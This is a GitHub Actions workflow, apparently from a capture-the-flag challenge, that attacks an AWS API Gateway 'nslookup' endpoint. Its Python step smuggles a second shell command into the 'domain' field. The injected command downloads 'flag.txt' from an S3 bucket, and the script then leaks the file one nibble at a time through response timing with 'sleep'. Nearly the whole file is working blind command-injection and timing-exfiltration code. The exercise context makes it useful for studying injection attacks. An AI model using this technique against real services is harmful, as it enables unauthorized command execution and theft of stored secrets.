name: Stage2-16-Flag-Timing-Test

on:
  push:
    branches:
      - corgi

permissions:
  contents: read
  id-token: write

jobs:
  timing:
    runs-on: ubuntu-latest

    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Install dependencies
        run: |
          python3 -m pip install requests requests-aws4auth --quiet

      - name: Extract first flag byte
        run: |
          python3 - <<'PY'
          import os
          import time
          import requests
          from requests_aws4auth import AWS4Auth

          api = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"

          auth = AWS4Auth(
              os.environ["AWS_ACCESS_KEY_ID"],
              os.environ["AWS_SECRET_ACCESS_KEY"],
              "us-east-1",
              "execute-api",
              session_token=os.environ["AWS_SESSION_TOKEN"]
          )

          def probe(shift):
              domain = (
                  "example.com; "
                  "/opt/aws s3api get-object "
                  "--bucket logad88e2b168aa387e "
                  "--key flag.txt "
                  "/tmp/log-flag.txt "
                  "--region us-east-1 "
                  "--endpoint-url https://s3.us-east-1.amazonaws.com "
                  ">/dev/null 2>&1 && "
                  "b=$(od -An -tu1 -N1 -j0 /tmp/log-flag.txt | tr -d ' '); "
                  f"n=$(((b >> {shift}) & 15)); "
                  "sleep \"$n\""
              )

              start = time.monotonic()

              response = requests.post(
                  api,
                  json={"domain": domain},
                  auth=auth,
                  timeout=20
              )

              elapsed = time.monotonic() - start

              print("SHIFT=" + str(shift))
              print("HTTP=" + str(response.status_code))
              print("ELAPSED=%.2f" % elapsed)

              return round(elapsed)

          high = probe(4)
          low = probe(0)

          value = (high << 4) | low

          print("HIGH_NIBBLE=" + str(high))
          print("LOW_NIBBLE=" + str(low))
          print("BYTE_VALUE=" + str(value))
          print("CHAR=" + chr(value))
          PY
